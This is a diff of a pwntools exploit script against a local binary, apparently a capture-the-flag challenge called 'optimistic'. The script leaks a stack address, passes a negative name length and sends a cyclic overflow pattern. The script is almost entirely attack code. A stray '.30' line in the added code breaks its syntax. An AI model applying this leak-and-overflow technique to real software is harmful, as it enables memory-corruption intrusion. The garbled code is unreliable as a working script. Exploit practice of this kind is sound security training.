@@ -15,11 +15,22 @@ io = process('/home/kali/Downloads/optimistic_patched')
 log.info('Get Stack Address')
 io.sendlineafter('(y/n): ', 'y')
 stack_address = io.recvline().decode().strip().split()[-1][2:]
-stack_address = bytes.fromhex(stack_address).rjust(8, '\x00')
+stack_address = bytes.fromhex(stack_address).rjust(8, b'\x00')
 stack_address = u64(stack_address, endian='big')
 stack_address += ret_offset
 log.success(f'Leaked stack address: {p64(stack_address)}')
 
+log.info('Send email and age')
+io.sendlineafter(': ', 'email')
+io.sendlineafter(': ', 'age')
+.30
+log.info('Send Name Lenght')
+io.sendlineafter(': ', '-1')
+
+payload = cyclic(200)
+
+log.info('Send payload to name')
+io.sendlineafter('Name: ', payload)
 
 
 
